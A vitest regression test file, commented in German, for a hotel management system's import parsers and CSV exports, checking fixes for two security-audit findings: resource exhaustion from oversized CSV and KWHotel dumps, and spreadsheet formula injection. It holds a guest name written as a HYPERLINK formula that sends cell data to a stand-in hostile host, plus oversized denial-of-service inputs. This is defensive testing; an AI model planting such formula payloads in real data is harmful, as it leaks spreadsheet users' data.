import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest'
import type { FastifyInstance } from 'fastify'
import { ensureSchema, truncateAll, appPool, ownerPool, makeProperty, makeCategory,
         makeResources, makeUser, makeReservation, type Fixture } from '@hotelpms/testing'
import type { Pool } from '@hotelpms/db'
import { addDays } from '@hotelpms/domain'
import type { KwhotelImportReport } from '@hotelpms/contracts'
import { buildServer } from '../platform/app.js'
import { registerAllRoutes } from '../routes/index.js'
import { limiters } from '../platform/rateLimit.js'
import { parseCsv, CsvError, MAX_SPALTEN, formelsicher, writeCsv } from '../platform/csv.js'
import { readKwhotelDump } from '../platform/legacyImport/kwhotel.js'
import { MAX_NAECHTE, personenJeZimmer } from '../routes/kwhotelImport.js'

/*
 * Befunde M9 und M10 aus dem Sicherheitsaudit vom 11.10.2026 (Bericht in den
 * Projektdateien, security/audit-2026-10-11.md): Rechenzeit und Speicher
 * ueber die Importparser, Formeln in CSV-Exporten. Jeder Fall hier lief vor
 * der Behebung durch.
 */

let owner: Pool
let app: FastifyInstance
let pool: Pool
let fx: Fixture
let auth: Record<string, string>

beforeAll(async () => {
  await ensureSchema()
  owner = ownerPool()
  const built = await buildServer({ pool: appPool(5) })
  app = built.app
  pool = built.pool
  registerAllRoutes(app)
  await app.ready()
})
afterAll(async () => { await app.close(); await owner.end(); await pool.end() })
beforeEach(async () => {
  await truncateAll()
  limiters.reset()
  fx = await makeProperty(owner)
  const u = await makeUser(owner,
    { email: 'chef@test.de', propertyId: fx.propertyId, roleKey: 'hotel_director' })
  auth = { cookie: `hp_session=${u.sessionId}` }
})

// ------------------------------------------------------------------ M9

/** Ein KWHotel-Abzug in der Form von `mariadb-dump`, nur mit dem Noetigsten. */
function abzug(opts: {
  pokoje: Array<[number, string]>
  rooms?: Array<[number, string]>
  rezerwacje?: Array<{ id: number; room: number; von: string; letzte: string; status: number }>
}): string {
  const tabelle = (name: string, spalten: string[]) =>
    `CREATE TABLE \`${name}\` (\n`
    + spalten.map(s => `  \`${s}\` varchar(255) DEFAULT NULL,`).join('\n')
    + `\n  PRIMARY KEY (\`${spalten[0]}\`)\n) ENGINE=InnoDB;\n`
  const werte = (name: string, rows: string[]) =>
    rows.length === 0 ? '' : `INSERT INTO \`${name}\` VALUES ${rows.join(',')};\n`
  return tabelle('Pokoje', ['PokojID', 'Symbol', 'Opis'])
    + werte('Pokoje', opts.pokoje.map(([id, s]) => `(${id},'${s}',NULL)`))
    + tabelle('rooms', ['id', 'name'])
    + werte('rooms', (opts.rooms ?? opts.pokoje).map(([id, s]) => `(${id},'${s}')`))
    + tabelle('Klienci', ['KlientID', 'Nazwisko', 'Countrie'])
    + werte('Klienci', [`(100,'Deichgraf Anna','DE')`])
    + tabelle('Rezerwacje', ['RezerwacjaID', 'PokojID', 'DataOd', 'DataDo', 'Cena', 'Osob',
                             'KlientID', 'status_id'])
    + werte('Rezerwacje', (opts.rezerwacje ?? []).map(z =>
        `(${z.id},${z.room},'${z.von} 00:00:00','${z.letzte} 00:00:00','100.0000',2,100,`
        + `${z.status})`))
    + tabelle('RezerwKlient', ['RezerwacjaID', 'KlientID'])
    + werte('RezerwKlient', (opts.rezerwacje ?? []).map(z => `(${z.id},100)`))
}

describe('M9: Importparser begrenzen Rechenzeit und Speicher', () => {
  it('liest 40 000 Zimmer aus der neueren Tabelle in linearer Zeit', () => {
    // Vorher je Zimmer `some()` ueber alle bisherigen: 7,3 s im Audit.
    const rooms: Array<[number, string]> = []
    for (let i = 2; i <= 40_001; i++) rooms.push([i, `Z${i}`])
    const text = abzug({ pokoje: [[1, '01 EZ']], rooms: [[1, '01 EZ'], ...rooms],
      rezerwacje: [{ id: 1, room: 1, von: '2026-01-01', letzte: '2026-01-02', status: 1 }] })

    const start = performance.now()
    const b = readKwhotelDump(text)
    const dauer = performance.now() - start

    expect(b.rooms).toHaveLength(40_001)
    expect(b.rooms[0]).toMatchObject({ id: '1', name: '01 EZ' })
    expect(b.rooms.at(-1)).toMatchObject({ id: '40001', name: 'Z40001' })
    // Grosszuegig, damit ein langsamer CI-Laeufer nicht rot wird; der
    // quadratische Weg lag um ein Vielfaches darueber.
    expect(dauer).toBeLessThan(2000)
  })

  it('rechnet die Belegung je Zimmer in einem Durchgang und wie vorher', () => {
    const b = readKwhotelDump(abzug({ pokoje: [[1, '01 EZ'], [2, '02 DZ']],
      rezerwacje: [{ id: 1, room: 1, von: '2026-01-01', letzte: '2026-01-02', status: 1 }] }))
    const m = personenJeZimmer(b)
    expect(m.get('1')).toBe(2)
    expect(m.has('2')).toBe(false)
  })

  it('weist eine CSV mit mehr als 200 Spalten ab, statt sie zu lesen', async () => {
    expect(MAX_SPALTEN).toBe(200)
    // Genau an der Grenze geht es noch.
    const genau = Array.from({ length: MAX_SPALTEN }, (_, i) => `s${i}`).join(';')
    expect(parseCsv(`${genau}\n${genau}\n`).header).toHaveLength(MAX_SPALTEN)

    const breit = ';'.repeat(200_000)
    let fehler: unknown
    try { parseCsv(`code;name\r\nDZ;${breit}\r\n`) } catch (e) { fehler = e }
    expect(fehler).toBeInstanceOf(CsvError)
    expect((fehler as CsvError).key).toBe('import.csv.tooManyColumns')
    expect((fehler as CsvError).line).toBe(2)

    // Ueber die Route: eine verstaendliche 422, nicht neun Sekunden Rechenzeit.
    const r = await app.inject({
      method: 'POST', url: '/v1/imports/categories', headers: auth,
      payload: { propertyId: fx.propertyId, csv: `code;name${breit}\r\nDZ;Doppel\r\n` } })
    expect(r.statusCode, r.body).toBe(422)
    const body = JSON.parse(r.body) as { code: string; detail: string }
    expect(body.code).toBe('import.csv.tooManyColumns')
    expect(body.detail).toContain('200 Spalten')

    // Dasselbe ueber die Altsysteme, die denselben Leser benutzen.
    const alt = await app.inject({
      method: 'POST', url: '/v1/imports/legacy/hotline/reservations', headers: auth,
      payload: { propertyId: fx.propertyId, data: `a;b${breit}\r\n` } })
    expect(alt.statusCode, alt.body).toBe(422)
  })

  it('meldet eine KWHotel-Zeile mit mehr als 366 Naechten und schreibt nichts', async () => {
    const kat = await makeCategory(owner, fx.propertyId, { code: 'DZ' })
    await makeResources(owner, fx.propertyId, kat, 1)
    await owner.query(`UPDATE resource SET code = '1' WHERE property_id = $1`, [fx.propertyId])
    const heute = (await owner.query<{ d: string }>(`SELECT current_date::text AS d`)).rows[0]!.d
    expect(MAX_NAECHTE).toBe(366)

    // Storniert: bindet kein Kontingent und kam deshalb vorher bis zum
    // Schreiben durch, wo jede Nacht eine Zeile wurde -- bei
    // 1000-01-01..9998-12-31 drei Millionen. Hier reicht eine Nacht zu viel.
    const lang = { id: 1, room: 1, von: addDays(heute, -500), letzte: addDays(heute, -500 + 366),
                   status: 11 }
    // Genau 366 Naechte gehen.
    const grenze = { id: 2, room: 1, von: addDays(heute, -900), letzte: addDays(heute, -900 + 365),
                     status: 11 }
    const r = await app.inject({
      method: 'POST', url: '/v1/imports/legacy/kwhotel', headers: auth,
      payload: { propertyId: fx.propertyId, commit: true,
                 data: abzug({ pokoje: [[1, '01 DZ']], rezerwacje: [lang, grenze] }) } })
    expect(r.statusCode, r.body).toBe(200)
    const bericht = JSON.parse(r.body) as KwhotelImportReport
    expect(bericht.dryRun).toBe(true)
    expect(bericht.findings.filter(f => f.level === 'error')).toEqual([
      expect.objectContaining({ messageKey: 'import.kwhotel.stayTooLong', reference: '1',
                                params: { reference: '1', nights: 367, max: 366 } })])
    const n = await owner.query<{ n: number }>(`SELECT count(*)::int AS n FROM reservation_night`)
    expect(n.rows[0]!.n).toBe(0)
  })
})

// ------------------------------------------------------------------ M10

describe('M10: CSV-Exporte starten keine Formeln', () => {
  it('entschaerft Formelanfaenge und laesst reine Zahlen mit Vorzeichen stehen', () => {
    expect(formelsicher('=HYPERLINK("http://x";"y")')).toBe('\'=HYPERLINK("http://x";"y")')
    expect(formelsicher('+49 170 1234')).toBe("'+49 170 1234")
    expect(formelsicher('-1+2')).toBe("'-1+2")
    expect(formelsicher('@SUMME(A1)')).toBe("'@SUMME(A1)")
    expect(formelsicher('\t=1')).toBe("'\t=1")
    expect(formelsicher('\r=1')).toBe("'\r=1")
    // Reine Zahlen: Betraege im Kassenbuch-Export, Korrekturen in der Arbeitszeit.
    for (const z of ['-12,50', '+12,50', '-30', '0.5', '15,00']) expect(formelsicher(z)).toBe(z)
    // Gewoehnlicher Text bleibt, und ein zweites Hochkomma gibt es nicht.
    expect(formelsicher('Petersen')).toBe('Petersen')
    expect(formelsicher("'=1")).toBe("'=1")

    expect(writeCsv([['=1+1', -30, '-0,50', null, 'a;b']]))
      .toBe('\'=1+1;-30;-0,50;;"a;b"\r\n')
  })

  it('setzt im Gaesteverzeichnis ein Hochkomma vor einen Nachnamen mit Formel', async () => {
    const kat = await makeCategory(owner, fx.propertyId, { code: 'DZ' })
    const [zimmer] = await makeResources(owner, fx.propertyId, kat, 1)
    await owner.query(`SELECT inventory_materialize($1,'2026-09-01'::date,'2026-11-01'::date)`,
      [fx.propertyId])
    const regel = (await owner.query<{ id: number }>(
      `INSERT INTO tax_rule (property_id, code, name, kind, basis, amount_cent)
       VALUES ($1,'KURTAXE','Kurtaxe','city_tax','per_person_night',250) RETURNING id`,
      [fx.propertyId])).rows[0]!.id
    // So kaeme der Name aus dem Online-Check-in.
    const name = '=HYPERLINK("https://boese.example/?"&A1;"Klick")'
    const g = await owner.query<{ id: number }>(
      `INSERT INTO guest (account_id, last_name, first_name, city, country)
       VALUES ($1,$2,'@Anke','Westerland','DE') RETURNING id`, [fx.accountId, name])
    const res = await makeReservation(owner, {
      propertyId: fx.propertyId, categoryId: kat, arrival: '2026-10-01',
      departure: '2026-10-02', status: 'CheckedOut', resourceId: zimmer! })
    await owner.query(`UPDATE reservation SET primary_guest_id = $2 WHERE id = $1`,
      [res.reservationId, g.rows[0]!.id])
    const f = await owner.query<{ id: number }>(
      `INSERT INTO folio (property_id, reservation_id, guest_id, kind)
       VALUES ($1,$2,$3,'guest') RETURNING id`,
      [fx.propertyId, res.reservationId, g.rows[0]!.id])
    await owner.query(
      `INSERT INTO charge (property_id, folio_id, business_date, description, quantity,
                           net_cent, tax_cent, gross_cent, tax_rate_bp,
                           revenue_account, reservation_id, tax_rule_id)
       VALUES ($1,$2,'2026-10-01','Kurtaxe',2,500,0,500,0,'8300',$3,$4)`,
      [fx.propertyId, f.rows[0]!.id, res.reservationId, regel])

    const r = await app.inject({ method: 'GET', headers: auth,
      url: `/v1/properties/${fx.propertyId}/exports/guest-levy`
         + '?from=2026-10-01&to=2026-10-31&format=csv' })
    expect(r.statusCode, r.body).toBe(200)
    const zeile = r.body.trim().split(/\r\n/)[1]!
    // Das Feld ist wegen des Semikolons in Anfuehrungszeichen; darin
    // beginnt es mit dem Hochkomma, nicht mit dem Gleichheitszeichen.
    expect(zeile.startsWith(`"'=HYPERLINK(`)).toBe(true)
    expect(zeile).toContain(";'@Anke;")
    // Der Betrag bleibt eine Zahl.
    expect(zeile).toContain(';5,00;')
  })
})
